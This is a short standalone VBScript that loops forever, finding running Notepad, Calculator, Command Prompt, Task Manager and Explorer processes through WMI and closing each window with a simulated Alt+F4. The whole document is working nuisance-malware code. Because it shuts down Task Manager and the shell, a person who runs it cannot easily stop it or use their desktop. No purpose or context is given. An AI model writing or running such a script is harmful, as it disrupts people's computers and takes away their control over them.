Set WshShell = WScript.CreateObject("WScript.Shell")
strExeNames = Array("notepad.exe", "calc.exe", "cmd.exe", "taskmgr.exe", "explorer.exe")

Do
    For Each strExeName In strExeNames
        Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
        Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = '" & strExeName & "'")
        
        If colProcessList.Count > 0 Then
            For Each objProcess In colProcessList
                WshShell.AppActivate objProcess.ProcessId
                WScript.Sleep 500 'wait for window to activate before closing
                WshShell.SendKeys "%{F4}" 'sends Alt+F4 to close window
            Next
        End If
    Next
    WScript.Sleep 1 'wait before checking again
Loop
